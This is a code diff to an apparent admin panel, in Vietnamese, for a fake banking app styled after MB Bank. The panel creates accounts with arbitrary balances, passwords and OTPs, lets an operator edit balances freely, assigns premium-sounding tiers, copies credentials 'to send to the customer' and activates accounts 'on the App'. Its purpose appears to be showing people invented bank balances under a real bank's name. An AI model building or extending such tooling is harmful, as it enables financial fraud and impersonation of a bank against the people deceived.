@@ -629,9 +629,14 @@
         <div class="t1-field">
           <label class="t1-label">
             <span>💰 5. Số Dư Khởi Tạo (VND)</span>
-            <span style="color:#059669; cursor:pointer;" onclick="document.getElementById('new-bal').value='950000000'">Đặt 950tr</span>
+            <span style="display:flex; gap:6px;">
+              <span style="color:#64748b; cursor:pointer;" onclick="document.getElementById('new-bal').value='0'">0đ</span> |
+              <span style="color:#0284c7; cursor:pointer;" onclick="document.getElementById('new-bal').value='200000'">200k</span> |
+              <span style="color:#059669; cursor:pointer;" onclick="document.getElementById('new-bal').value='5000000'">5tr</span> |
+              <span style="color:#d97706; cursor:pointer;" onclick="document.getElementById('new-bal').value='50000000'">50tr</span>
+            </span>
           </label>
-          <input type="number" id="new-bal" class="t1-input" value="950000000" />
+          <input type="number" id="new-bal" class="t1-input" value="200000" placeholder="Nhập số dư khởi tạo (VND)" />
         </div>
 
         <!-- 6. MÃ OTP -->
@@ -925,6 +930,12 @@
                 <button class="t1-btn t1-btn-primary" style="padding: 7px 12px; font-size: 12px;" onclick="copyClientInfo('${num}', '${pass}', '${phone}', '${name}', '${bal}', '${otp}')" title="Copy gửi khách">
                   📋 Gửi Khách
                 </button>
+                <button class="t1-btn t1-btn-success" style="padding: 7px 12px; font-size: 12px;" onclick="promptUpdateBalance('${num}', ${bal})" title="Chỉnh số dư">
+                  💵 Số Dư
+                </button>
+                <button class="t1-btn t1-btn-secondary" style="padding: 7px 12px; font-size: 12px;" onclick="openEditAccountModal('${num}')" title="Sửa tài khoản">
+                  ✏️ Sửa
+                </button>
                 ${!isActive ? `
                   <button class="t1-btn t1-btn-gold" style="padding: 7px 12px; font-size: 12px;" onclick="setActiveAccount('${num}')" title="Kích hoạt lên App">
                     ⚡ Kích Hoạt
@@ -956,6 +967,12 @@
                 <div style="display: inline-flex; gap: 5px; flex-wrap: wrap; justify-content: center;">
                   <button class="t1-btn t1-btn-primary" style="padding: 4px 8px; font-size: 11px;" onclick="copyClientInfo('${num}', '${pass}', '${phone}', '${name}', '${bal}', '${otp}')" title="Copy gửi khách">
                     📋 Gửi Khách
+                  </button>
+                  <button class="t1-btn t1-btn-success" style="padding: 4px 8px; font-size: 11px;" onclick="promptUpdateBalance('${num}', ${bal})" title="Chỉnh số dư">
+                    💵 Số Dư
+                  </button>
+                  <button class="t1-btn t1-btn-secondary" style="padding: 4px 8px; font-size: 11px;" onclick="openEditAccountModal('${num}')" title="Sửa thông tin">
+                    ✏️ Sửa
                   </button>
                   ${!isActive ? `
                     <button class="t1-btn t1-btn-gold" style="padding: 4px 8px; font-size: 11px;" onclick="setActiveAccount('${num}')" title="Kích hoạt lên App">
@@ -1079,7 +1096,125 @@
       }
     }
 
-    // 4. XÓA TÀI KHOẢN
+    // 4. CHỈNH SỬA SỐ DƯ TRỰC TIẾP (QUICK BALANCE UPDATE)
+    async function promptUpdateBalance(num, currentBal) {
+      const input = prompt(`💰 Nhập số dư mới (VND) cho tài khoản [${num}]:\n(Hiện tại: ${Number(currentBal).toLocaleString('vi-VN')} VND)`, currentBal);
+      if (input === null) return;
+      const cleanBal = Number(String(input).replace(/[^\d.-]/g, ''));
+      if (isNaN(cleanBal) || cleanBal < 0) {
+        alert('Số dư nhập vào không hợp lệ!');
+        return;
+      }
+
+      try {
+        const key = getAdminKey();
+        const res = await fetch('/api/dispatch', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'x-admin-key': key
+          },
+          body: JSON.stringify({
+            action: 'update_balance',
+            admin_key: key,
+            accountNumber: num,
+            balance: cleanBal
+          })
+        });
+        const data = await res.json();
+        if (data.success) {
+          log(`💵 Đã cập nhật số dư tài khoản [${num}] thành ${cleanBal.toLocaleString('vi-VN')} VND`);
+          await loadAdminData();
+        } else {
+          alert('Lỗi cập nhật số dư: ' + (data.message || data.error));
+        }
+      } catch (err) {
+        alert('Lỗi: ' + err.message);
+      }
+    }
+
+    // 5. MỞ MODAL CHỈNH SỬA TOÀN DIỆN TÀI KHOẢN
+    let editingAccNum = null;
+    async function openEditAccountModal(num) {
+      editingAccNum = num;
+      try {
+        const res = await fetch(`/api/dispatch?ts=${Date.now()}`, {
+          headers: { 'x-admin-key': getAdminKey() }
+        });
+        const data = await res.json();
+        const acc = (data.accounts && data.accounts[num]) ? data.accounts[num] : null;
+        if (!acc) {
+          alert('Không tìm thấy thông tin tài khoản!');
+          return;
+        }
+
+        document.getElementById('edit-acc-num').textContent = num;
+        document.getElementById('edit-name').value = acc.customerName || acc.accountName || '';
+        document.getElementById('edit-phone').value = acc.phone || acc.sdt || num;
+        document.getElementById('edit-pass').value = acc.password || '123456';
+        document.getElementById('edit-otp').value = acc.otp || '111111';
+        document.getElementById('edit-bal').value = typeof acc.balance === 'number' ? acc.balance : 0;
+        document.getElementById('edit-tier').value = acc.tier || 'MB Priority Digital';
+
+        document.getElementById('modal-edit-acc').style.display = 'flex';
+      } catch (err) {
+        alert('Lỗi: ' + err.message);
+      }
+    }
+
+    function closeEditModal() {
+      document.getElementById('modal-edit-acc').style.display = 'none';
+      editingAccNum = null;
+    }
+
+    async function submitEditAccount() {
+      if (!editingAccNum) return;
+      const name = document.getElementById('edit-name').value.trim().toUpperCase();
+      const phone = document.getElementById('edit-phone').value.trim();
+      const pass = document.getElementById('edit-pass').value.trim();
+      const otp = document.getElementById('edit-otp').value.trim();
+      const bal = Number(document.getElementById('edit-bal').value) || 0;
+      const tier = document.getElementById('edit-tier').value;
+
+      if (!name || !pass) {
+        alert('Vui lòng điền họ tên và mật khẩu!');
+        return;
+      }
+
+      try {
+        const key = getAdminKey();
+        const res = await fetch('/api/dispatch', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'x-admin-key': key
+          },
+          body: JSON.stringify({
+            action: 'update_account',
+            admin_key: key,
+            accountNumber: editingAccNum,
+            customerName: name,
+            phone: phone,
+            password: pass,
+            otp: otp,
+            balance: bal,
+            tier: tier
+          })
+        });
+        const data = await res.json();
+        if (data.success) {
+          log(`✏️ Đã cập nhật thông tin tài khoản [${editingAccNum}] ${name}`);
+          closeEditModal();
+          await loadAdminData();
+        } else {
+          alert('Lỗi cập nhật: ' + (data.message || data.error));
+        }
+      } catch (err) {
+        alert('Lỗi: ' + err.message);
+      }
+    }
+
+    // 6. XÓA TÀI KHOẢN
     async function deleteAccount(num) {
       if (!confirm(`Xác nhận xóa tài khoản [${num}] khỏi hệ thống?`)) return;
       try {
@@ -1107,13 +1242,62 @@
       if (checkAdminAuth()) {
         loadAdminData();
       }
-      // Tự động làm mới mỗi 5 giây nếu đang mở khóa
       setInterval(() => {
         if (checkAdminAuth()) {
           loadAdminData();
         }
       }, 5000);
     });
+  </script>
+
+  <!-- MODAL CHỈNH SỬA TÀI KHOẢN T1 PRO -->
+  <div id="modal-edit-acc" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(15,23,42,0.65); backdrop-filter:blur(4px); z-index:9999; align-items:center; justify-content:center; padding:16px;">
+    <div class="t1-card" style="width:100%; max-width:520px; padding:28px; box-shadow:0 20px 40px rgba(0,0,0,0.25);">
+      <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1.5px solid #f1f5f9; padding-bottom:14px; margin-bottom:18px;">
+        <div style="font-size:17px; font-weight:850; color:#0f172a;">
+          ✏️ Chỉnh Sửa Tài Khoản: <span id="edit-acc-num" style="color:#0284c7; font-family:monospace;">-</span>
+        </div>
+        <button class="t1-btn t1-btn-secondary" onclick="closeEditModal()" style="padding:4px 10px; font-size:12px;">✕ Đóng</button>
+      </div>
+
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-bottom:18px;">
+        <div class="t1-field" style="grid-column: 1 / -1;">
+          <label class="t1-label">👤 Họ và Tên Chủ Tài Khoản</label>
+          <input type="text" id="edit-name" class="t1-input" style="text-transform:uppercase;" />
+        </div>
+        <div class="t1-field">
+          <label class="t1-label">🔒 Mật Khẩu Đăng Nhập</label>
+          <input type="text" id="edit-pass" class="t1-input" />
+        </div>
+        <div class="t1-field">
+          <label class="t1-label">📱 Số Điện Thoại</label>
+          <input type="text" id="edit-phone" class="t1-input" />
+        </div>
+        <div class="t1-field">
+          <label class="t1-label">💰 Số Dư Khả Dụng (VND)</label>
+          <input type="number" id="edit-bal" class="t1-input" />
+        </div>
+        <div class="t1-field">
+          <label class="t1-label">📲 Mã OTP Smart GD</label>
+          <input type="text" id="edit-otp" class="t1-input" />
+        </div>
+        <div class="t1-field" style="grid-column: 1 / -1;">
+          <label class="t1-label">⭐ Hạng Tài Khoản (Tier)</label>
+          <select id="edit-tier" class="t1-select">
+            <option value="MB Priority Digital">MB Priority Digital (Mặc định cao cấp)</option>
+            <option value="MB Private Banking VIP">MB Private Banking VIP (Đặc quyền)</option>
+            <option value="MB Diamond Member">MB Diamond Member</option>
+            <option value="MB Platinum Standard">MB Platinum Standard</option>
+          </select>
+        </div>
+      </div>
+
+      <div style="display:flex; justify-content:flex-end; gap:10px;">
+        <button class="t1-btn t1-btn-secondary" onclick="closeEditModal()">Hủy</button>
+        <button class="t1-btn t1-btn-gold" onclick="submitEditAccount()">💾 Lưu Thay Đổi</button>
+      </div>
+    </div>
+  </div>
   </script>
 </body>
 </html>
